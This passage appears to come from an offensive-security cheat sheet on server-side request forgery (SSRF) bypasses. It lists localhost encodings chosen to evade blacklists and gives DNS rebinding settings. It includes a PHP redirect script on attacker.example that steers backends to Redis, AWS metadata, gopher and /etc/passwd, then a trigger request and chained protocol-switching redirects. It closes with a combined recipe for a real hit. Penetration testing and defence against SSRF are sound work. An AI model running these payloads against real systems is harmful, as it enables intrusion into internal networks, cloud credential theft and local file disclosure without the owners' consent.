https://lock.cmpxchg8b.com/rebinder.html?2   # custom IP

# Key parameters
- Set an extremely short TTL (0 or 1) to prevent the backend from caching the resolution
- Use round-robin to alternately return the two A records [public IP, 127.0.0.1]
- Variants of 127.0.0.1 (when the validation logic only blacklists the literal 127.0.0.1):
    127.1
    127.0.1
    0.0.0.0
    0
    0x7f000001
    2130706433        # decimal
    017700000001      # octal
    [::1]
    [::ffff:7f00:1]
    localtest.me      # a public domain resolving to 127.0.0.1
    spoofed.burpcollaborator.net

# Self-hosted tools: singularity / dns-rebind / rbndr
```

**When to use**:
- The backend code has a two-stage `parse_url + gethostbyname + allowlist + curl_exec`
- The WAF only looks at the literal host of the request URL, not the IP actually connected to
- When AWS metadata (169.254.169.254) is literally blacklisted

#### 3. 302 redirect-following bypass

The server only validates the **user-submitted URL**, but `curl --location` / `requests follow_redirects=True` follows the 302 to any URL. Hanging `header("Location: http://internal/")` on an attacker domain suffices.

```php
<?php
// Attacker-controlled service — attacker.example/redir.php
header("Location: http://127.0.0.1:6379/");   // Redis
// header("Location: http://169.254.169.254/latest/meta-data/");  // AWS metadata
// header("Location: gopher://127.0.0.1:6379/_...");  // gopher intranet lateral movement
// header("Location: file:///etc/passwd");  // file:// local read
exit;
```

```text
# Trigger: fill the SSRF input box with the attacker domain; the backend validation passes (points to the public internet) → follows the redirect to the intranet
POST /fetch HTTP/1.1
url=https://attacker.example/redir.php

# Chained redirects to evade protocol restrictions:
# The backend only allows https → attacker.example/redir1 (https)
#                → attacker.example/redir2 (http)  ← protocol switch
#                → http://127.0.0.1:6379/  ← final landing
```

**Variants**:
- The HTTP `Refresh:` header (some HTTP clients follow it)
- HTML `<meta http-equiv="refresh">` (headless rendering scenarios)
- Multi-hop 30x chains with different protocols interspersed (http → https → http → gopher / dict / file)

**Key points for a real hit (the trio combined)**:
1. Use the **UA header** to find an endpoint with an internal branch (look at the response characteristics)
2. Use **DNS rebinding** to bypass a literal-IP blacklist
3. Use a **302 redirect** to bypass the protocol allowlist + trigger a gopher / file landing

Use the vendor-provided SSRF test platform or a self-hosted interactsh for OOB verification; do not use a public DNSLog.

---
